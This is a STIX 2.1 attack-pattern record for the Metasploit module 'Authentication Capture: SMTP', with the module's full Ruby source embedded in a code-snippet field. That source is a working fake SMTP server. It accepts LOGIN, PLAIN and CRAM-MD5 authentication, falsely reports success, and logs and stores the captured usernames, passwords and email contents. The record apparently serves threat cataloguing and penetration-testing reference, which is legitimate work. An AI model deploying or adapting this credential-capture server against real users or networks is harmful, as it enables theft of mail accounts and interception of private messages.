{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b81b5f5-6506-42e0-982d-262cab7ea334",
    "created": "2024-08-14T16:22:00.826067Z",
    "modified": "2024-08-14T16:22:00.826071Z",
    "name": "Authentication Capture: SMTP",
    "description": " This module provides a fake SMTP service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/smtp.rb",
            "external_id": "smtp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.samlogic.net/articles/smtp-commands-reference-auth.htm"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc5321"
        },
        {
            "source_name": "reference",
            "url": "http://fehcom.de/qmail/smtpauth.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'Authentication Capture: SMTP',\n      'Description' => %q{\n        This module provides a fake SMTP service that\n      is designed to capture authentication credentials.\n      },\n      'Author' => ['ddz', 'hdm', 'h00die'],\n      'License' => MSF_LICENSE,\n      'Actions' => [\n        [ 'Capture', { 'Description' => 'Run SMTP capture server' } ]\n      ],\n      'PassiveActions' => [\n        'Capture'\n      ],\n      'DefaultAction' => 'Capture',\n      'References' => [\n        [ 'URL', 'https://www.samlogic.net/articles/smtp-commands-reference-auth.htm' ],\n        [ 'URL', 'https://datatracker.ietf.org/doc/html/rfc5321' ],\n        [ 'URL', 'http://fehcom.de/qmail/smtpauth.html' ]\n      ],\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 25 ]),\n        OptBool.new('AUTHPROMPT', [ true, 'Require authentication from clients', false ])\n      ]\n    )\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    exploit\n  end\n\n  def auth_plain_parser(data)\n    # this data is \\00 delimited, and has 3 fields: un\\00un\\00\\pass.  Not sure why a double username, but we drop the first one\n    data = Rex::Text.decode_base64(data).split(\"\\00\")\n    data = data.drop(1)\n\n    # if only a username is submitted, it will appear as \\00un\\00\n    # we already cut off the empty username, so nowe we want to add on the empty password\n    if data.length == 1\n      data << ''\n    end\n    data\n  end\n\n  def on_client_connect(client)\n    @state[client] = { name: \"#{client.peerhost}:#{client.peerport}\", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }\n    client.put \"220 SMTP Server Ready\\r\\n\"\n  end\n\n  def on_client_data(client)\n    data = client.get_once\n    return if !data\n\n    print_status(\"SMTP: #{@state[client][:name]} Command: #{data.strip}\")\n\n    if (@state[client][:data_mode])\n      @state[client][:data_buff] ||= ''\n      @state[client][:data_buff] += data\n\n      idx = @state[client][:data_buff].index(\"\\r\\n.\\r\\n\")\n      if data.include? \"RSET\\r\\n\"\n        idx = @state[client][:data_buff].index(\"RSET\\r\\n\")\n      end\n      if idx\n        report_note(\n          host: @state[client][:ip],\n          type: 'smtp_message',\n          data: @state[client][:data_buff][0, idx]\n        )\n        @state[client][:data_buff][0, idx].split(\"\\n\").each do |line|\n          print_status(\"SMTP: #{@state[client][:name]} EMAIL: #{line.strip}\")\n        end\n\n        @state[client][:data_buff] = nil\n        @state[client][:data_mode] = nil\n        client.put \"250 OK\\r\\n\"\n      end\n\n      return\n    end\n\n    if (@state[client][:auth_login])\n      if @state[client][:user].nil?\n        @state[client][:user] = Rex::Text.decode_base64(data)\n        client.put \"334 #{Rex::Text.encode_base64('Password')}\\r\\n\"\n        return\n      end\n      @state[client][:pass] = Rex::Text.decode_base64(data)\n      print_good(\"SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}\")\n      report_cred(\n        ip: @state[client][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'smtp',\n        user: @state[client][:user],\n        password: @state[client][:pass],\n        proof: data # will be base64 encoded, but its proof...\n      )\n      @state[client][:auth_login] = nil\n      client.put \"235 2.7.0 Authentication successful\\r\\n\"\n      return\n    end\n\n    if (@state[client][:auth_plain])\n      # this data is \\00 delimited, and has 3 fields: un\\00un\\00\\pass.  Not sure why a double username\n      un_pass = auth_plain_parser data\n\n      @state[client][:user] = un_pass.first\n      @state[client][:pass] = un_pass.last\n      print_good(\"SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}\")\n      report_cred(\n        ip: @state[client][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'smtp',\n        user: @state[client][:user],\n        password: @state[client][:pass],\n        proof: data # will be base64 encoded, but its proof...\n      )\n      @state[client][:auth_plain] = nil\n      client.put \"235 2.7.0 Authentication successful\\r\\n\"\n      return\n    end\n\n    if (@state[client][:auth_cram])\n      # data is <username><space><digest aka hash>\n      decoded = Rex::Text.decode_base64(data).split(' ')\n      @state[client][:user] = decoded.first\n      # challenge # response\n      @state[client][:pass] = \"#{@state[client][:auth_cram_challenge]}##{decoded.last}\"\n      report_cred(\n        ip: @state[client][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'smtp',\n        user: @state[client][:user],\n        password: @state[client][:pass],\n        proof: data, # will be base64 encoded, but its proof...\n        type: 'cram'\n      )\n      client.put \"235 2.7.0 Authentication successful\\r\\n\"\n      print_good(\"SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}\")\n      @state[client][:auth_cram_challenge] = nil\n      @state[client][:auth_cram] = nil\n      return\n    end\n\n    cmd, arg = data.strip.split(/\\s+/, 2)\n    arg ||= ''\n\n    case cmd.upcase\n    when 'HELO', 'EHLO'\n      if datastore['AUTHPROMPT']\n        client.put \"250 AUTH LOGIN PLAIN\\r\\n\"\n      else\n        client.put \"250 OK\\r\\n\"\n      end\n      return\n\n    when 'MAIL'\n      _, from = data.strip.split(':', 2)\n      @state[client][:from] = from.strip\n      client.put \"250 OK\\r\\n\"\n      return\n\n    when 'RCPT'\n      _, targ = data.strip.split(':', 2)\n      @state[client][:rcpt] = targ.strip\n      client.put \"250 OK\\r\\n\"\n      return\n\n    when 'DATA'\n      @state[client][:data_mode] = true\n      client.put \"354 Send message content; end with <CRLF>.<CRLF>\\r\\n\"\n      return\n\n    when 'QUIT'\n      client.put \"221 OK\\r\\n\"\n      return\n\n    when 'PASS'\n\n      @state[client][:pass] = arg\n\n      report_cred(\n        ip: @state[client][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'pop3',\n        user: @state[client][:user],\n        password: @state[client][:pass],\n        proof: arg\n      )\n      print_good(\"SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}\")\n      return\n\n    when 'AUTH'\n      if arg == 'LOGIN'\n        @state[client][:auth_login] = true\n        client.put \"334 #{Rex::Text.encode_base64('Username')}\\r\\n\"\n        return\n      elsif arg.split(' ').first == 'PLAIN'\n        if arg.include? ' ' # the creds are passed as well\n          un_pass = auth_plain_parser arg.split(' ').last\n\n          @state[client][:user] = un_pass.first\n          @state[client][:pass] = un_pass.last\n          print_good(\"SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}\")\n          report_cred(\n            ip: @state[client][:ip],\n            port: datastore['SRVPORT'],\n            service_name: 'smtp',\n            user: @state[client][:user],\n            password: @state[client][:pass],\n            proof: data # will be base64 encoded, but its proof...\n          )\n          client.put \"235 2.7.0 Authentication successful\\r\\n\"\n          return\n        end\n        @state[client][:auth_plain] = true\n        client.put \"334\\r\\n\"\n        return\n      elsif arg == 'CRAM-MD5'\n        # create and send challenge\n        challenge = \"<#{Rex::Text.rand_text_numeric(9..12)}@#{datastore['SRVHOST']}>\"\n        client.put \"334 #{Rex::Text.encode_base64(challenge)}\\r\\n\"\n        @state[client][:auth_cram] = true\n        @state[client][:auth_cram_challenge] = challenge\n        return\n      end\n      # some other auth we dont understand\n      vprint_error(\"Unknown authentication type string: #{arg}\")\n      client.put \"503 Server Error\\r\\n\"\n    else\n      vprint_error(\"Unknown command: #{arg}\")\n    end\n    client.put \"503 Server Error\\r\\n\"\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    if opts[:type] == 'cram'\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: opts[:user],\n        private_data: opts[:password],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(opts[:password])\n      }.merge(service_data)\n    else\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: opts[:user],\n        private_data: opts[:password],\n        private_type: :password\n      }.merge(service_data)\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_close(client)\n    @state.delete(client)\n  end\n\nend\n"
}